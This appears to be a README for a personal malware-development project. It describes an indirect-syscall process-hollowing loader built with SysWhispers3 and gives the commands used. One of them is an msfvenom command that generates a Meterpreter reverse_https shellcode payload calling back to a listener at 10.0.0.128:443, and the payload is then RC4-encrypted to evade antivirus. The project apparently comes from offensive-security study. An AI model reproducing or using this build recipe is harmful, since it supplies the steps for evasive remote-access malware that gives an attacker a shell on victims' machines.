HUGE thank you to the Syswhipsers project and the MALDEV Academy team for getting my excited about these kinds of projects!

syswhispers brnach is the syswhipers implementation

indirect is my attempt at an indirect systemcall implementation to run meterpreter shellcode via process hollowing


```
python3 syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtResumeThread,NtWriteVirtualMemory,NtAllocateVirtualMemory,NtProtectVirtualMemory,NtReadVirtualMemory -o /home/noah/Desktop/MALDEV/modules/ProcessHollowing/syswhispers3_files -v
```

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.0.0.128 lport=443 exitfunc=thread -f raw > payload.raw
```

Payload into HellShell Rc4 decryptor using `SystemFunction032`
